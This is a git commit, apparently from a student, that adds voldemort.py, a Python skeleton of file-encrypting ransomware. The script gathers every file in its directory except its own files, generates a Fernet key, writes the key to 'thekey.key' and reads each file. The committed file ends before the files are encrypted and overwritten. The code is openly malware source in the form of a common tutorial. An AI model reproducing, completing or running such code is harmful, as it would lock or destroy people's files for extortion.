cd10c9cbe1e611344a07a4791bb2330f679403d9
25je0749-glitch <25je0749@iitism.ac.in>
2025-12-17 19:44:14 +0530

    Create voldemort.py

---
+++ voldemort.py
@@ -0,0 +1,26 @@
+#!/usr/bin/env python3
+
+import os
+from cryptography.fernet import Fernet
+
+#let's find some files
+
+files = []
+
+for file in os.listdir():
+        if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
+                continue
+        if os.path.isfile(file):
+                files.append(file)
+
+print(files)
+
+
+key = Fernet.generate_key()
+
+with open("thekey.key","wb") as thekey:
+        thekey.write(key)
+
+for file in files:
+        with open(file,"rb") as thefile:
+                contents = thefile.read()
